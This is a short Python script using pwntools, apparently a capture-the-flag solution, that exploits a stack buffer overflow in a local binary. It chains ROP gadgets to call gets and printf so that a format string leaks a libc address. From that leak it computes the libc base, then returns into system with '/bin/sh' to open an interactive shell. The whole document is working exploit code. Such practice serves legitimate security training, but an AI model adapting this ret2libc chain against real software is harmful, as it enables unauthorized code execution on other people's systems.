from pwn import *

binary = context.binary = ELF("./something")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

rop = ROP(binary)

r = process(binary.path)
gdb.attach(r, api=True)

ret = rop.find_gadget(["ret"])[0]  # 0x000000000040101a
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"])[0]  # 0x00000000004012a3
fmt_addr = 0x404080
get_addr = binary.symbols["gets"]  # 0x00401090
printf_addr = binary.symbols["printf"]  # 0x00401080
vuln_addr = binary.symbols["vuln"]  # 0x004011dd
leak_off = libc.symbols['_IO_2_1_stdin_']  # 0x0000000000219aa0

print(r.recv())

payload = b"a"*40 + p64(ret) + p64(pop_rdi_ret) + p64(fmt_addr) + p64(get_addr)
payload += p64(ret) + p64(pop_rdi_ret) + p64(fmt_addr) + p64(printf_addr)
payload += p64(ret) + p64(vuln_addr)
r.sendline(payload)

payload = b"%3$p"
r.sendline(payload)

leak = int(r.recv().split(b"Say")[0], 16)
log.info(f"Leak: {hex(leak)}")
libc_base = leak - leak_off
log.info(f"Libc base: {hex(libc_base)}")

system_off = libc.symbols['system']  # 0x0000000000050d70
binsh_off = next(libc.search(b'/bin/sh\x00'))  # 0x1d8698

system_add = libc_base + system_off
binsh_add = libc_base + binsh_off
payload = b"a"*40 + p64(ret) + p64(pop_rdi_ret) + \
    p64(binsh_add) + p64(system_add)

r.sendline(payload)
r.interactive()
